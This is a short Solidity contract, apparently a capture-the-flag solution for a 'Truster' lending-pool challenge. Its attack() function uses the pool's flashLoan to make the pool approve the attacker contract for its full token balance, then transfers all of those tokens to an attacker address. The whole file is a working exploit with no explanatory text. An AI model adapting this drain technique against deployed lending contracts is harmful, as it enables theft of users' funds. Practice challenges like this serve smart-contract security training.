
pragma solidity ^0.8.6;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
contract AttackTruster {
    address pool;
    IERC20 token;
    address tokenAddress;
    address attacker;
    constructor(address poolAddress,address erc20Token,address attackerAddress ){
        pool = poolAddress;
        tokenAddress = erc20Token;
        token = IERC20(erc20Token);
        attacker = attackerAddress;
    }

    function attack() public {
        TrusterLenderPool livePool = TrusterLenderPool(pool);
        uint approveAmount = token.balanceOf(pool);
        bytes memory attackCall = abi.encodeWithSignature("approve(address,uint256)",address(this),approveAmount);
        livePool.flashLoan(0,attacker,tokenAddress,attackCall);
        token.transferFrom(pool, attacker, approveAmount);
    }


}